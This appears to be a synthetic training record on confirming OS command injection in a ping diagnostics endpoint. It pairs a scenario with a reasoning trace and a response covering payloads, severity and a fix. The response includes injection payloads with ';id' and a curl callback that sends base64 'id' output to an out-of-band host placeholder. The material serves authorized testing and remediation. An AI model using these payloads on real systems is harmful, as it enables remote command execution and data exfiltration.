# CMDI — gapfill_synthetic

- source: gapfill_synthetic
- class: cmdi

## Scenario

A diagnostics endpoint takes ?host= and runs `ping -c1 <host>`, returning output. In scope. I see ping output for 8.8.8.8. How do I confirm command injection safely (no destruction)?

## Analysis / Response

<think>
If host is concatenated into a shell string, metacharacters break out of ping. Safe confirmation = a non-destructive observable side effect, not rm/reverse shell. Two signals: (1) command substitution changing output (`;id`), or (2) an out-of-band DNS/HTTP callback so I don't depend on reflection (works blind too). Prefer OOB — confirms execution without echo. Severity critical: RCE as web user, S:U unless it pivots.
</think>

**OS command injection** via `host`.

**Safe confirmation (OOB, non-destructive):**
```
?host=127.0.0.1;curl%20http://OAST/`id|base64`
```
A callback at your OAST listener with a base64 `id` blob confirms execution even if output isn't reflected. Reflected variant `?host=127.0.0.1;id` → `uid=33(www-data)`.

**Root cause:** input concatenated into a shell command and run via a shell, so `;` `|` backticks are interpreted.

**Impact:** arbitrary command execution as the web user → host compromise, lateral movement.

**Severity:** Critical — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (public, unauth).

**Fix:** don't shell out — `subprocess.run(["ping","-c1",host])` (argv, no shell) plus validate host as hostname/IP.
**Edge case:** argv still needs validation — a leading `-f`/`-p` as host abuses ping itself (argument injection).
